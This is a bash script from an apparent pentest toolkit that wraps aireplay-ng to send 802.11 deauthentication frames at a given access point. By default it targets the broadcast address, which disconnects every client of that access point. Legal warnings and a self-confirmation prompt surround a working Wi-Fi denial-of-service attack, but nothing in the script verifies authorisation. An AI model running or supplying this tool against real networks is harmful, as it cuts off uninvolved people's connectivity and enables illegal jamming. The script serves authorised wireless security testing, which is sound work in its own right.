#!/usr/bin/env bash
# wifi-deauth.sh — 802.11 deauthentication — EDUCATIONAL, own network only
# Cyberdeck-BlackArch | MIT | Part of scripts/network/
set -uo pipefail
# ── locate shared libraries ──────────────────────────────────────────────
_SDIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
for _L in "$_SDIR/../../lib" "$HOME/.cyberdeck/lib" "$HOME/.local/share/cyberdeck/lib"; do
  [[ -f "$_L/utils.sh" ]] && { LIB="$_L"; break; }
done
if [[ -n "${LIB:-}" ]]; then source "$LIB/colors.sh"; source "$LIB/ui.sh"; source "$LIB/utils.sh";
else echo "[!] cyberdeck lib not found — run ./install.sh first" >&2; exit 1; fi

usage() {
  cyber_banner "WIFI-DEAUTH" "802.11 deauthentication — EDUCATIONAL, own network only"
  cat <<USAGE
  USAGE: wifi-deauth.sh <ap-mac> <interface-mon> [client-mac] [count]
  Sends deauth frames with aireplay-ng. Requires monitor mode.
  *** Only ever use on a network you own. Jamming others is illegal. ***
USAGE
  printf '\n  %sLogs: ~/.cyberdeck/logs/   Reports: ~/.cyberdeck/reports/%s\n' "$C_MUTED" "$C_RESET"
}
[[ "${1:-}" == "--help" || "${1:-}" == "-h" || "${1:-}" == "help" ]] && { usage; exit 0; }
DEPS=(aireplay-ng:aircrack-ng); check_deps "${DEPS[@]}" || exit 1
main() {
  cyber_banner "WIFI-DEAUTH" "802.11 deauthentication — EDUCATIONAL, own network only"
  legal_warning
  log_msg "START args: $*"

  warn "EDUCATIONAL TOOL — deauthenticating networks you do not own is illegal in most jurisdictions."
  local ap="${1:-}" iface="${2:-}" client="${3:-FF:FF:FF:FF:FF:FF}" count="${4:-10}"
  [[ -z "$ap" || -z "$iface" ]] && die "Usage: wifi-deauth.sh <AP-MAC> <monitor-iface> [client-MAC] [count]"
  confirm "I confirm this is MY OWN network / authorised lab. Proceed?" || die "Aborted."
  require_root "$@"; log_msg "DEAUTH ap=$ap iface=$iface client=$client count=$count"
  sudo aireplay-ng --deauth "$count" -a "$ap" -c "$client" "$iface" | tee -a "$LOG_FILE"; ok "Done."
  log_msg "DONE rc=$?"
}
main "$@"
